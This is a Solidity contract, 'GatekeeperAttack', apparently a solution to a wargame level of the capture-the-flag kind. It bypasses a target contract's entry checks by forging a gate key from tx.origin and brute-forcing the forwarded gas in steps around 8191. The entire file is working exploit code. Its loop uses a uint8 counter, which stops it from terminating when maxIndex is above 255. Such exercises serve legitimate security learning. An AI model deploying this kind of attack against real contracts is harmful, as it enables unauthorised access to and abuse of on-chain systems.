// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";

interface IGatekeeper {
    function enter(bytes8 _gateKey) external  returns (bool);
}

contract GatekeeperAttack {

    IGatekeeper public immutable gatekeeper;

    constructor(address _gatekeeper) {
        gatekeeper = IGatekeeper(_gatekeeper);
    }

    function attack(uint256 k, uint256 start, uint256 maxIndex) public {
        bytes8 gateKey = key();
        uint256 base = k * 8191;

        for(uint8 i = 0; i < maxIndex; i++) {
          (bool success,) = address(gatekeeper).call{gas: base + start + i}(
            abi.encodeWithSelector(gatekeeper.enter.selector, gateKey)
          );
          if (success) break;
        }

    }

    function key() public view returns(bytes8) {
        // uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)

        uint16 low16 = uint16(uint160(tx.origin));
        
        return bytes8(uint64(0x12345678)<<32 | low16);

    }

}